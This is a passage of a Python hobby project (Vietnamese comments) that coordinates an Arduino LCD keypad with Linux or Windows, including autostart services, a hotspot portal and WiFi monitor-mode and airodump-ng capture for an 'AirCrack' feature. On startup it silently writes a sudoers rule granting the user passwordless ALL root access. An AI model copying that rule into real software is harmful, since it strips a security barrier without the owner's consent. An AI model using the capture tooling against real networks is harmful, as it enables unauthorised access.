#!/usr/bin/env python3
"""
console_coordinator.py - May chu dieu phoi trung tam Cross-Platform (Linux & Windows).
Phien ban 3.2.0: Linux Server Headless + Native Desktop Dual-Architecture.

Dac tinh chuyen nghiep:
1. Tu dong nhan dien he dieu hanh Linux / Windows:
   - Tren Linux: Tu dong nhan dien /dev/ttyACM* (Uno) va /dev/ttyUSB* (CH340/FTDI/CP210).
   - Tren Windows: Tu dong nhan dien COM*.
2. Tu dong nhan dien moi truong Co Man Hinh (Desktop) hoac Khong Man Hinh (Headless):
   - Chay tren Linux Server / Raspberry Pi Lite / SSH / Docker (khong co $DISPLAY):
     Tu dong chuyen sang Pure Terminal Live Dashboard voi mau sac ANSI chuyen nghiep (CPU = 0.0%).
   - Chay tren Desktop (Windows hoac Linux co X11/Wayland):
     Tu dong mo cua so giao dien Native Tkinter khi Arduino vao 'PC test' va tu dong dong khi thoat/reset.
   - Ho tro tham so: python console_coordinator.py --headless de ep chay che do console thuan tuy.
3. Dong bo cai dat hai chieu qua os_settings.json va EEPROM noi bo ATmega328P.
4. Dieu phoi vong doi ung dung dong: Vao 'PC test' -> Bat; Thoat 'PC test' hoac Reset -> Tat.
"""

import sys
import os
import time
import json
import socket
from typing import Optional, Dict, Any, List, Tuple

# Bo sung duong dan thu vien
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)

from lcd_keypad_engine import (
    LCDKeypadEngine,
    Packet,
    CMD_REQ_SETTINGS,
    CMD_SAVE_SETTINGS,
    CMD_RESET_ALL_SETTINGS,
    CMD_DISPLAY_UPDATE,
    CMD_REQ_LINUX_SUDO_ITEM,
    CMD_REQ_LINUX_INFO,
    CMD_HOTSPOT_ACTION,
    CMD_SET_BACKLIGHT,
    CMD_APP_EXIT,
    CMD_PING,
    RESP_SETTINGS,
    RESP_LINUX_SUDO_ITEM,
    RESP_LINUX_INFO,
    RESP_HOTSPOT_STATUS,
    RESP_APP_ENTER,
    RESP_APP_EXIT,
    RESP_OS_BOOT,
    RESP_BTN_STATE,
    RESP_DEBUG_LOG,
    BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT, BTN_SELECT, BTN_NONE,
)
import serial.tools.list_ports

SETTINGS_FILE = os.path.join(BASE_DIR, "os_settings.json")

# Cong loopback khoa tien trinh don nhat (Single-Instance Mutex)
COORDINATOR_MUTEX_PORT = 49281


class SingleInstanceLock:
    """
    Co che khoa don tien trinh (Single-Instance Mutex) co kha nang TU DONG DONG Coordinator cu:
    - Neu phat hien Coordinator cu dang chay: tu dong gui tin hieu SHUTDOWN de dong cai cu,
      giai phong cong va nhuong quyen cho Coordinator moi khoi dong ngay lap tuc!
    """

    def __init__(self, port: int = COORDINATOR_MUTEX_PORT):
        self.port = port
        self.sock: Optional[socket.socket] = None
        self._stop_requested = False

    def acquire_or_takeover(self) -> bool:
        if self._try_bind():
            self._start_listener()
            return True

        print(f"\n[MUTEX] Phat hien Coordinator cu dang chay tren cong {self.port} -> Dang tu dong dong tien trinh cu...")

        # Neu tren Linux co systemd service chay ngam, dung service de foreground khong bi danh nhau
        if sys.platform.startswith("linux"):
            try:
                import subprocess
                chk = subprocess.run(["systemctl", "is-active", "arduino-coordinator.service"], capture_output=True, text=True)
                if chk.stdout.strip() == "active":
                    print("[SYSTEMD] Dung background service de foreground chay truc tiep...")
                    subprocess.run(["sudo", "-n", "systemctl", "stop", "arduino-coordinator.service"], capture_output=True)
                    time.sleep(0.6)
            except Exception:
                pass

        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(1.5)
            client.connect(("127.0.0.1", self.port))
            client.sendall(b"SHUTDOWN\n")
            client.close()
        except Exception:
            pass

        t_start = time.time()
        while time.time() - t_start < 2.5:
            time.sleep(0.15)
            if self._try_bind():
                print("[MUTEX] Da dong tien trinh cu thanh cong va khoi dong tien trinh moi!\n")
                self._start_listener()
                return True

        self._kill_process()
        time.sleep(0.5)
        if self._try_bind():
            print("[MUTEX] Da giai phong cong cuong buc va khoi dong tien trinh moi!\n")
            self._start_listener()
            return True

        return False

    def _try_bind(self) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if hasattr(socket, "SO_EXCLUSIVEADDRUSE"):
                s.setsockopt(socket.SOL_SOCKET, socket.SO_EXCLUSIVEADDRUSE, 1)
            elif hasattr(socket, "SO_REUSEADDR"):
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("127.0.0.1", self.port))
            s.listen(2)
            self.sock = s
            return True
        except (OSError, socket.error):
            self.sock = None
            return False

    def _start_listener(self) -> None:
        def listen_loop():
            while self.sock and not self._stop_requested:
                try:
                    conn, _ = self.sock.accept()
                    data = conn.recv(64)
                    if b"SHUTDOWN" in data:
                        print("\n[MUTEX] Nhan lenh SHUTDOWN tu tien trinh moi -> Tu dong thoat va nhuong quyen...")
                        try:
                            conn.sendall(b"OK\n")
                            conn.close()
                        except Exception:
                            pass
                        self.release()
                        os._exit(0)
                    conn.close()
                except Exception:
                    break
        import threading
        t = threading.Thread(target=listen_loop, daemon=True)
        t.start()

    def _kill_process(self) -> None:
        import subprocess
        try:
            if sys.platform.startswith("win"):
                cmd = f"netstat -ano | findstr {self.port}"
                out = subprocess.check_output(cmd, shell=True, text=True)
                for line in out.strip().splitlines():
                    parts = line.split()
                    if len(parts) >= 5 and "LISTENING" in parts:
                        pid = parts[-1]
                        if pid and pid != str(os.getpid()):
                            subprocess.run(f"taskkill /F /PID {pid}", shell=True, capture_output=True)
            else:
                subprocess.run(f"fuser -k {self.port}/tcp 2>/dev/null", shell=True, capture_output=True)
        except Exception:
            pass

    def release(self) -> None:
        self._stop_requested = True
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

# Kiem tra ho tro GUI Native (Tkinter)
def check_gui_available() -> bool:
    if "--headless" in sys.argv or "--cli" in sys.argv or "--no-gui" in sys.argv:
        return False
    # Tren Linux, tu dong nhan dien DISPLAY :0 neu co session X11/Desktop
    if sys.platform.startswith("linux"):
        if not os.environ.get("DISPLAY"):
            for xauth_path in [
                os.path.expanduser("~/.Xauthority"),
            ]:
                if os.path.exists(xauth_path):
                    os.environ["DISPLAY"] = ":0"
                    os.environ["XAUTHORITY"] = xauth_path
                    break
        if not os.environ.get("DISPLAY") and not os.environ.get("WAYLAND_DISPLAY"):
            return False
    try:
        import tkinter as tk
        root = tk.Tk()
        root.withdraw()
        root.destroy()
        return True
    except Exception:
        return False


# Bang mau ANSI cho Terminal Linux / Windows
ANSI_RESET = "\033[0m"
ANSI_BOLD = "\033[1m"
ANSI_CYAN = "\033[1;36m"
ANSI_GREEN = "\033[1;32m"
ANSI_YELLOW = "\033[1;33m"
ANSI_MAGENTA = "\033[1;35m"
ANSI_RED = "\033[1;31m"
ANSI_BLUE = "\033[1;34m"
ANSI_DIM = "\033[2m"

BTN_STYLES = {
    "UP": {
        "title": "▲ NUT LEN (UP KEY)",
        "color_hex": "#00E1FF",
        "ansi": ANSI_CYAN,
        "desc": "Arduino vua bam phim LEN (UP)!",
        "action": "Len / Tang gia tri / Di chuyen tien",
        "code": "0x02",
        "lcd_ack": "PC: Nhan Nut LEN",
    },
    "DOWN": {
        "title": "▼ NUT XUONG (DOWN KEY)",
        "color_hex": "#FF9100",
        "ansi": ANSI_YELLOW,
        "desc": "Arduino vua bam phim XUONG (DOWN)!",
        "action": "Xuong / Giam gia tri / Cuon trang",
        "code": "0x03",
        "lcd_ack": "PC: Nhan XUONG",
    },
    "LEFT": {
        "title": "◀ NUT TRAI (LEFT) -> VE OS",
        "color_hex": "#C36EFF",
        "ansi": ANSI_MAGENTA,
        "desc": "Arduino vua bam phim TRAI de quay ve Menu Tong cua OS!",
        "action": "Quay ve Menu Tong cua OS (Back to OS Menu)",
        "code": "0x04",
        "lcd_ack": "PC: <- Ve OS...",
    },
    "RIGHT": {
        "title": "▶ NUT PHAI (RIGHT KEY)",
        "color_hex": "#32FF82",
        "ansi": ANSI_GREEN,
        "desc": "Arduino vua bam phim PHAI (RIGHT)!",
        "action": "Sang phai / Chuyen muc tiep theo",
        "code": "0x01",
        "lcd_ack": "PC: Nhan Nut PHAI",
    },
    "SELECT": {
        "title": "● NUT SELECT (XAC NHAN)",
        "color_hex": "#FFE132",
        "ansi": ANSI_YELLOW,
        "desc": "Arduino vua bam phim XAC NHAN (SELECT)!",
        "action": "Xac nhan / Chon / Thuc thi lenh",
        "code": "0x05",
        "lcd_ack": "PC: Nhan SELECT",
    },
    "NONE": {
        "title": "DANG CHO TIN HIEU TU ARDUINO...",
        "color_hex": "#8291AA",
        "ansi": ANSI_DIM,
        "desc": "Hay bam nut bat ky tren Shield (UP/DOWN/LEFT/RIGHT/SELECT).",
        "action": "Chua co nut nao duoc nhan",
        "code": "0x00",
        "lcd_ack": "PC: Ready...",
    },
}


def load_settings() -> Dict[str, Any]:
    default_settings = {
        "system": {
            "backlight": True,
            "sound": True,
            "device_name": "Arduino Uno R3",
        },
        "apps": {
            "native_game": {
                "difficulty": 1,
                "high_score": 100,
            },
            "pc_test": {
                "echo_lcd": True,
            },
            "counter": {
                "saved_count": 0,
            },
        },
        "last_updated": time.strftime("%Y-%m-%d %H:%M:%S"),
    }
    if not os.path.exists(SETTINGS_FILE):
        save_settings(default_settings)
        return default_settings
    try:
        with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            if "system" not in data:
                data = {
                    "system": {
                        "backlight": data.get("backlight", True),
                        "sound": data.get("sound", True),
                    },
                    "apps": default_settings["apps"],
                    "last_updated": data.get("last_updated", time.strftime("%Y-%m-%d %H:%M:%S")),
                }
            return data
    except Exception as e:
        print(f"[SETTINGS] Loi doc file: {e}. Dung cai dat mac dinh.")
        return default_settings


def save_settings(settings: Dict[str, Any]) -> None:
    settings["last_updated"] = time.strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(settings, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"[SETTINGS] Loi luu file: {e}")


def find_arduino_port() -> Optional[str]:
    """Tu dong tim cong COM cua Arduino Uno / CH340 tren ca Linux va Windows."""
    ports = list(serial.tools.list_ports.comports())
    if not ports:
        return None

    arduino_vids = {0x2341, 0x0043, 0x2A03, 0x1B4F, 0x1A86, 0x10C4, 0x0403}
    candidates = []

    for p in ports:
        score = 0
        desc = (p.description or "").lower()
        hwid = (p.hwid or "").lower()
        dev_lower = p.device.lower()

        # 1. Kiem tra Vendor ID
        if p.vid and p.vid in arduino_vids:
            score += 100
        if p.vid == 0x1A86 and p.pid == 0x7523:
            score += 50

        # 2. Kiem tra mo ta thiet bi
        if "arduino" in desc or "uno" in desc:
            score += 80
        if "ch340" in desc or "ch341" in desc or "wch" in desc:
            score += 60
        if "usb-serial" in desc or "usb serial" in desc:
            score += 40
        if "silicon labs" in desc or "cp210" in desc or "ftdi" in desc:
            score += 40
        if "1a86" in hwid or "2341" in hwid:
            score += 50

        # 3. Kiem tra duong dan thiet bi tren Linux
        if "ttyacm" in dev_lower:  # Chuan CDC-ACM (Arduino Uno R3 tren Linux)
            score += 90
        elif "ttyusb" in dev_lower: # Chuan USB-UART (CH340 tren Linux)
            score += 70

        if score > 0:
            candidates.append((score, p.device))

    if candidates:
        candidates.sort(key=lambda x: x[0], reverse=True)
        return candidates[0][1]

    # Fallback neu chi co dung 1 cong tren toan he thong
    if len(ports) == 1:
        return ports[0].device

    return None


def setup_sudo_nopasswd_linux() -> bool:
    """Cau hinh quyen NOPASSWD cho user hien tai tren Linux vao /etc/sudoers.d/."""
    if not sys.platform.startswith("linux"):
        print("[SUDO SETUP] Tinh nang nay chi ap dung tren he dieu hanh Linux.")
        return False

    import getpass
    import subprocess
    user = getpass.getuser()
    sudoers_file = "/etc/sudoers.d/arduino-coordinator"
    rule_line = f"{user} ALL=(ALL) NOPASSWD: ALL\n"

    try:
        test = subprocess.run(["sudo", "-n", "true"], capture_output=True)
        if test.returncode == 0:
            print(f"[SUDO SETUP] User '{user}' da co quyen sudo NOPASSWD!")
            return True

        print(f"[SUDO SETUP] Dang cau hinh NOPASSWD cho user '{user}' vao {sudoers_file}...")
        p = subprocess.Popen(["sudo", "tee", sudoers_file], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = p.communicate(input=rule_line)
        if p.returncode == 0:
            subprocess.run(["sudo", "chmod", "0440", sudoers_file])
            print("[SUDO SETUP] CAU HINH THANH CONG! Sudo gio day chay khong can mat khau.")
            return True
        else:
            print(f"[SUDO SETUP] That bai: {stderr}")
            return False
    except Exception as e:
        print(f"[SUDO SETUP] Loi: {e}")
        return False


def install_autostart() -> bool:
    """
    Tu dong cai dat Coordinator chay cung he thong moi khi khoi dong may.
    - Tren Linux: Tao va enable systemd service (/etc/systemd/system/arduino-coordinator.service).
    - Tren Windows: Tao file VBScript chay ngam bang pythonw.exe trong Thu muc Startup.
    """
    script_path = os.path.abspath(__file__)
    script_dir = os.path.dirname(script_path)

    if sys.platform.startswith("linux"):
        import getpass, subprocess
        user = getpass.getuser()
        py_bin = sys.executable or "/usr/bin/python3"
        service_file = "/etc/systemd/system/arduino-coordinator.service"

        unit_content = f"""[Unit]
Description=Arduino LCD OS Central Coordinator Service
After=network.target network-manager.service
Wants=network.target

[Service]
Type=simple
User={user}
SupplementaryGroups=dialout
WorkingDirectory={script_dir}
Environment=DISPLAY=:0
Environment=XAUTHORITY=/home/{user}/.Xauthority
ExecStart={py_bin} -u {script_path} --headless
Restart=on-failure
RestartSec=3
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
"""
        print(f"[AUTOSTART] Dang tao file systemd service: {service_file}...")
        try:
            p = subprocess.Popen(["sudo", "-n", "tee", service_file], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            p.communicate(input=unit_content)
            if p.returncode != 0:
                print("[AUTOSTART] Loi: Khong the ghi file service vao /etc/systemd/system/")
                return False

            subprocess.run(["sudo", "-n", "systemctl", "daemon-reload"], check=True)
            subprocess.run(["sudo", "-n", "systemctl", "enable", "arduino-coordinator.service"], check=True)
            subprocess.run(["sudo", "-n", "systemctl", "restart", "arduino-coordinator.service"], check=True)
            print("[AUTOSTART] CAI DAT THANH CONG TREN LINUX!")
            print("            Service: arduino-coordinator.service [ENABLED & RUNNING]")
            print("            Coordinator se luon tu dong chay moi khi bat may Linux!")
            return True
        except Exception as e:
            print(f"[AUTOSTART] Loi khi cai dat systemd service: {e}")
            return False

    elif sys.platform.startswith("win"):
        appdata = os.environ.get("APPDATA")
        if not appdata:
            print("[AUTOSTART] Khong tim thay bien moi truong APPDATA tren Windows!")
            return False

        startup_dir = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
        if not os.path.exists(startup_dir):
            print(f"[AUTOSTART] Thu muc Startup khong ton tai: {startup_dir}")
            return False

        py_dir = os.path.dirname(sys.executable)
        pyw_exe = os.path.join(py_dir, "pythonw.exe")
        target_py = pyw_exe if os.path.exists(pyw_exe) else sys.executable

        vbs_path = os.path.join(startup_dir, "ArduinoCoordinator.vbs")
        vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run """{target_py}"" ""{script_path}""", 0, False
'''
        try:
            with open(vbs_path, "w", encoding="utf-8") as f:
                f.write(vbs_content)
            print("[AUTOSTART] CAI DAT THANH CONG TREN WINDOWS!")
            print(f"            File khoi dong ngam: {vbs_path}")
            print("            Coordinator se luon tu dong chay ngam moi khi dang nhap Windows!")
            return True
        except Exception as e:
            print(f"[AUTOSTART] Loi khi ghi file vao thu muc Startup: {e}")
            return False

    return False


def remove_autostart() -> bool:
    """Huy kich hoat tu dong chay cung he thong."""
    if sys.platform.startswith("linux"):
        import subprocess
        try:
            subprocess.run(["sudo", "-n", "systemctl", "stop", "arduino-coordinator.service"], capture_output=True)
            subprocess.run(["sudo", "-n", "systemctl", "disable", "arduino-coordinator.service"], capture_output=True)
            subprocess.run(["sudo", "-n", "rm", "-f", "/etc/systemd/system/arduino-coordinator.service"], capture_output=True)
            subprocess.run(["sudo", "-n", "systemctl", "daemon-reload"], capture_output=True)
            print("[AUTOSTART] Da go bo systemd service arduino-coordinator tren Linux.")
            return True
        except Exception as e:
            print(f"[AUTOSTART] Loi go bo: {e}")
            return False
    elif sys.platform.startswith("win"):
        appdata = os.environ.get("APPDATA", "")
        vbs_path = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup\ArduinoCoordinator.vbs")
        if os.path.exists(vbs_path):
            try:
                os.remove(vbs_path)
                print(f"[AUTOSTART] Da go bo file khoi dong tai: {vbs_path}")
                return True
            except Exception as e:
                print(f"[AUTOSTART] Loi go bo: {e}")
                return False
        else:
            print("[AUTOSTART] File khoi dong khong ton tai.")
            return True
    return False


def get_linux_sudo_commands() -> List[tuple]:
    """
    Lay danh sach cac lenh sudo duoc phep chay tren Linux qua `sudo -n -l`.
    Dam bao khong hoi mat khau (-n non-interactive).
    Tren Windows (moi truong dev/test): Tra ve danh sach mo phong thuc te de kiem tra.
    """
    KNOWN_DESC = {
        "systemctl": "Dich vu he thong",
        "service": "Quan ly service",
        "apt": "Cai goi package",
        "apt-get": "Cai goi phan mem",
        "dpkg": "Quan ly goi deb",
        "docker": "Quan ly contain",
        "podman": "Quan ly container",
        "nmap": "Quet mang & port",
        "tcpdump": "Bat goi tin mang",
        "reboot": "Khoi dong lai OS",
        "shutdown": "Tat may chu OS",
        "journalctl": "Xem log he thong",
        "cat": "Doc noi dung file",
        "tail": "Xem duoi file log",
        "nano": "Sua file van ban",
        "vim": "Trinh soan thao",
        "bash": "Chay shell root",
        "sh": "Chay shell root",
        "nmcli": "Quan ly mang AP",
        "iw": "Quan ly wireless",
        "hostapd": "Phat AccessPoint",
        "iptables": "Tuong lua & NAT",
        "useradd": "Quan ly account",
        "ALL": "Toan quyen root",
    }

    COMMON_ROOT_CMDS = [
        ("systemctl", "Dich vu he thong"),
        ("nmcli", "Quan ly mang AP"),
        ("apt", "Cai goi package"),
        ("journalctl", "Xem log he thong"),
        ("reboot", "Khoi dong lai OS"),
        ("hostapd", "Phat AccessPoint"),
        ("iw", "Quan ly wireless"),
    ]

    if not sys.platform.startswith("linux"):
        # Môi trường Windows (Dev & Test): Giả lập danh sách quyền sudo Linux thực tế
        return [
            ("(ALL) Root", "Toan quyen he thog"),
            ("systemctl", "Dich vu he thong"),
            ("nmcli", "Quan ly mang AP"),
            ("apt", "Cai goi package"),
            ("journalctl", "Xem log he thong"),
            ("reboot", "Khoi dong lai OS"),
            ("hostapd", "Phat AccessPoint"),
            ("iw", "Quan ly wireless"),
        ]

    # Trên Linux: Thực thi `sudo -n -l`
    import subprocess
    import shutil
    try:
        proc = subprocess.run(["sudo", "-n", "-l"], capture_output=True, text=True, timeout=2.0)
        if proc.returncode != 0:
            return [("Sudo Loi Pass", "Can NOPASSWD")]

        output = proc.stdout
        cmds = []
        has_all = False
        lines = output.strip().splitlines()
        in_commands = False

        for line in lines:
            line_s = line.strip()
            if "may run the following commands" in line.lower():
                in_commands = True
                continue
            if not in_commands or not line_s:
                continue

            content = line_s
            if "NOPASSWD:" in content:
                content = content[content.find("NOPASSWD:") + len("NOPASSWD:"):].strip()
            else:
                import re
                content = re.sub(r'^\(.*?\)\s*', '', content).strip()

            parts = [p.strip() for p in content.split(',') if p.strip()]
            for p in parts:
                cmd_full = p.split()[0] if p.split() else p
                cmd_name = os.path.basename(cmd_full)
                if cmd_name == "ALL":
                    has_all = True
                else:
                    desc = KNOWN_DESC.get(cmd_name, f"Lenh {cmd_name}"[:16])
                    item = (cmd_name[:16], desc[:16])
                    if item not in cmds:
                        cmds.append(item)

        if has_all:
            cmds.insert(0, ("(ALL) Root", "Toan quyen he thog"))
            for c_name, c_desc in COMMON_ROOT_CMDS:
                if shutil.which(c_name):
                    item = (c_name[:16], c_desc[:16])
                    if item not in cmds:
                        cmds.append(item)

        if not cmds:
            cmds = [("(ALL) Root", "Toan quyen he thog")]
        return cmds

    except Exception as e:
        return [("Loi sudo -l", str(e)[:16])]


class CrossPlatformCoordinator:
    """Central Coordinator hoat dong da nen tang tren ca Linux Server va Windows."""

    def __init__(self, port: Optional[str] = None):
        self.explicit_port = port
        self.port = port or find_arduino_port()
        self.engine: Optional[LCDKeypadEngine] = None
        self.settings = load_settings()

        # Kiem tra moi truong co Desktop de bat Tkinter hay chay Headless Console
        self.has_gui = check_gui_available()
        self.ui_visible = False

        self.current_btn = "NONE"
        self.last_pressed_btn = "NONE"
        self.total_press_count = 0
        self.history: List[Dict[str, Any]] = []

        self.last_reconnect_check = time.time()
        self.last_heartbeat_print = time.time()
        self.running = True

        # State cache cho WifiSet & AirCrack thuc te
        self._wifi_scan_cache: List[Dict[str, Any]] = []
        self._wifi_scan_time: float = 0.0
        self._known_wifi_cache: List[Dict[str, Any]] = []
        self._aircrack_scan_cache: List[Dict[str, Any]] = []
        self._aircrack_scan_time: float = 0.0
        self._aircrack_target: Optional[Dict[str, Any]] = None
        self._aircrack_target_idx: int = 0
        self._hcf_files_cache: List[str] = []
        self._capture_proc = None
        self._found_portable_dir: Optional[str] = None

        # Kiem tra quyen sudo khong can mat khau tren Linux
        if sys.platform.startswith("linux"):
            try:
                import subprocess
                test = subprocess.run(["sudo", "-n", "true"], capture_output=True)
                if test.returncode == 0:
                    print("[SUDO CHECK] Quyen sudo NOPASSWD: SAN SANG (OK)")
                else:
                    print("[SUDO CHECK] Phat hien can mat khau sudo -> Dang tu dong thiet lap NOPASSWD...")
                    setup_sudo_nopasswd_linux()
            except Exception:
                pass

        # Khoi tao Tkinter neu he thong co ho tro GUI
        self.root = None
        if self.has_gui:
            self._init_tkinter_gui()

        # Tich hop module Hotspot & Sync tu wifi_manager_portable
        self.hotspot_service = None
        self.sync_service = None
        self.web_portal_thread = None
        self.web_portal_module = None
        self.wifi_config = None
        self.last_dual_push = time.time()
        self._init_wifi_portable()

        # Ket noi Serial ban dau
        self.connect()

    def _init_wifi_portable(self) -> None:
        home_dir = os.path.expanduser("~")
        portable_dirs = [
            os.path.join(os.path.dirname(os.path.dirname(BASE_DIR)), "wifi_manager_portable"),
            os.path.join(os.path.dirname(BASE_DIR), "wifi_manager_portable"),
            os.path.join(home_dir, "AC_NG", "wifi_manager_portable"),
            os.path.join(home_dir, "wifi_manager_portable"),
        ]
        found_dir = None
        for d in portable_dirs:
            if os.path.exists(os.path.join(d, "hotspot_service.py")):
                found_dir = d
                break

        if found_dir:
            self._found_portable_dir = found_dir
            if found_dir not in sys.path:
                sys.path.insert(0, found_dir)
            try:
                from hotspot_service import HotspotService
                from sync_service import SyncService
                import web_portal
                self.web_portal_module = web_portal

                cfg_file = os.path.join(found_dir, "config.json")
                if os.path.exists(cfg_file):
                    with open(cfg_file, "r", encoding="utf-8") as f:
                        self.wifi_config = json.load(f)
                else:
                    self.wifi_config = {
                        "hotspot": {"ssid": "PiPortable_WiFi", "password": os.environ.get("HOTSPOT_PASSWORD", ""), "interface": "AUTO"},
                        "settings": {"bg_run": False, "sync_before_host": True, "interface_mode": 0, "dual_card_push": True},
                        "server": {"master_url": "http://192.168.1.20:8000/api/wifi_db", "api_key": os.environ.get("PORTABLE_API_KEY", "")},
                        "portal": {"port": 8080}
                    }

                wh = self.settings.get("apps", {}).get("wifi_hotspot", {})
                if wh:
                    self.wifi_config.setdefault("settings", {}).update(wh)

                self.hotspot_service = HotspotService(self.wifi_config)
                self.sync_service = SyncService(self.wifi_config)
                print(f"[WIFI PORTABLE] Da tich hop HotspotService & SyncService tu: {found_dir}")
                self._ensure_web_portal_running()
            except Exception as e:
                print(f"[WIFI PORTABLE] Khong the khoi tao module: {e}")

    def _ensure_web_portal_running(self) -> None:
        if self.web_portal_thread and self.web_portal_thread.is_alive():
            return
        if not hasattr(self, "web_portal_module") or not self.web_portal_module:
            return

        port = self.wifi_config.get("portal", {}).get("port", 8080) if self.wifi_config else 8080
        def run():
            try:
                self.web_portal_module.run_portal(self.hotspot_service, self.sync_service, self.wifi_config, port=port)
            except Exception as e:
                print(f"[WEB PORTAL] Loi server: {e}")

        import threading
        self.web_portal_thread = threading.Thread(target=run, daemon=True, name="WebPortalThread")
        self.web_portal_thread.start()
        print(f"[WEB PORTAL] Da kich hoat Web Portal phuc vu Clients tai: http://0.0.0.0:{port}")

    def send_real_hotspot_status(self) -> None:
        if not self.engine or not self.engine.is_open:
            return
        if self.hotspot_service:
            summary = self.hotspot_service.get_status_summary()
            st_byte = 1 if summary["is_active"] else 0
            clients = min(summary["client_count"], 255)
            ip_oct = summary["ip_last_octet"]
            upstream = 1 if summary["upstream_online"] else 0
        else:
            st_byte, clients, ip_oct, upstream = 0, 0, 1, 1

        payload = bytes([st_byte, clients, ip_oct, upstream])
        pkt = Packet(cmd=RESP_HOTSPOT_STATUS, data=payload)
        try:
            self.engine._link.send_packet(pkt)
            print(f"[HOTSPOT] >>> Da gui trang thai sang Arduino: AP={'BAT' if st_byte else 'TAT'}, Cl={clients}, Upstream={'ON' if upstream else 'OFF'}")
        except Exception:
            pass

    def send_packet(self, cmd: int, data: bytes) -> None:
        if self.engine and self.engine.is_open:
            try:
                self.engine._link.send_packet(Packet(cmd=cmd, data=data))
            except Exception:
                pass

    @staticmethod
    def _to_lcd_ascii(text: str, max_len: int = 12) -> str:
        """Chuyen chuoi UTF-8 (co dau tieng Viet) sang ASCII 7-bit hien thi tren LCD 16x2."""
        import unicodedata
        if not text:
            return ""
        s = str(text).replace("đ", "d").replace("Đ", "D")
        s = unicodedata.normalize("NFKD", s)
        s = "".join(c for c in s if not unicodedata.combining(c))
        s = "".join(c if 32 <= ord(c) <= 126 else "_" for c in s)
        return s[:max_len]

    def _list_wireless_interfaces(self) -> List[str]:
        """Lay danh sach cac interface wireless thuc te tren Linux (wlan0, wlan1, wlan1mon...)."""
        if not sys.platform.startswith("linux"):
            return ["wlan0"]
        ifaces: List[str] = []
        try:
            net_dir = "/sys/class/net"
            if os.path.exists(net_dir):
                for name in sorted(os.listdir(net_dir)):
                    if name == "lo":
                        continue
                    if os.path.exists(os.path.join(net_dir, name, "wireless")) or os.path.exists(
                        os.path.join(net_dir, name, "phy80211")
                    ):
                        ifaces.append(name)
        except Exception:
            pass
        if not ifaces:
            try:
                import subprocess
                out = subprocess.check_output(["iw", "dev"], text=True, timeout=3)
                for line in out.splitlines():
                    s = line.strip()
                    if s.startswith("Interface "):
                        ifaces.append(s.split()[1])
            except Exception:
                pass
        return ifaces

    def _resolve_wireless_iface(self, card_idx: Optional[int] = None, for_aircrack: bool = False) -> Tuple[str, int]:
        """
        Chon interface wireless thuc te tu card_idx (0=AUTO, 1=wlan0, 2=wlan1, 3=wlan2).
        Neu he thong chi co wlan1 ma card_idx=0 hoac 1 thi tu dong fallback ve wlan1.
        Tra ve (iface_name, iface_idx_for_lcd).
        """
        if card_idx is None:
            apps = self.settings.get("apps", {})
            if for_aircrack:
                card_idx = int(apps.get("aircrack", {}).get("selected_card", 0))
            else:
                card_idx = int(apps.get("wifi_set", {}).get("iface_mode", 0))

        ifaces = self._list_wireless_interfaces()
        if not ifaces:
            return ("wlan0", 0)

        preferred_map = {1: "wlan0", 2: "wlan1", 3: "wlan2"}
        target = preferred_map.get(card_idx)
        if target:
            if target in ifaces:
                return (target, card_idx)
            if f"{target}mon" in ifaces:
                return (f"{target}mon", card_idx)

        # Fallback: uu tien wlan1 (USB adapter) cho AirCrack hoac interface dau tien co san
        if for_aircrack:
            for cand in ["wlan1mon", "wlan1", "wlan0mon", "wlan0"]:
                if cand in ifaces:
                    idx = 2 if "wlan1" in cand else (1 if "wlan0" in cand else 0)
                    return (cand, idx)

        chosen = ifaces[0]
        idx = 2 if "wlan1" in chosen else (1 if "wlan0" in chosen else 0)
        return (chosen, idx)

    def _get_iface_mode_num(self, iface: str) -> int:
        """Tra ve mode hien tai cua card: 0=MGD, 1=MON, 2=AP."""
        if not sys.platform.startswith("linux"):
            return 0
        import subprocess
        try:
            out = subprocess.check_output(["iw", "dev", iface, "info"], text=True, timeout=3)
            for line in out.splitlines():
                s = line.strip().lower()
                if s.startswith("type "):
                    t = s.split()[1]
                    if "monitor" in t:
                        return 1
                    if "ap" in t or "master" in t:
                        return 2
                    return 0
        except Exception:
            pass
        return 0

    def _stop_capture_proc(self) -> None:
        """Dung tien trinh airodump-ng chay ngam neu co."""
        import subprocess
        if self._capture_proc is not None:
            try:
                self._capture_proc.terminate()
                self._capture_proc.wait(timeout=1.5)
            except Exception:
                try:
                    self._capture_proc.kill()
                except Exception:
                    pass
            self._capture_proc = None
        if sys.platform.startswith("linux"):
            try:
                subprocess.run(["sudo", "-n", "killall", "-q", "airodump-ng"], capture_output=True, timeout=2)
            except Exception:
                pass

    def _set_interface_mode(self, iface: str, mode: int) -> Tuple[bool, str]:
        """
        Chuyen doi mode thuc te cua card WiFi tren Linux:
        mode: 0=Managed (MGD), 1=Monitor (MON), 2=AP (Hotspot), 3=Client (CLI)
        """
        if not sys.platform.startswith("linux"):
            return True, iface
        import subprocess

        base_iface = iface[:-3] if iface.endswith("mon") else iface

        if mode == 1:  # MONITOR MODE
            try:
                subprocess.run(["sudo", "-n", "nmcli", "dev", "set", base_iface, "managed", "no"], capture_output=True, timeout=4)
                subprocess.run(["sudo", "-n", "ip", "link", "set", base_iface, "down"], capture_output=True, timeout=4)
                r = subprocess.run(["sudo", "-n", "iw", "dev", base_iface, "set", "type", "monitor"], capture_output=True, text=True, timeout=4)
                subprocess.run(["sudo", "-n", "ip", "link", "set", base_iface, "up"], capture_output=True, timeout=4)
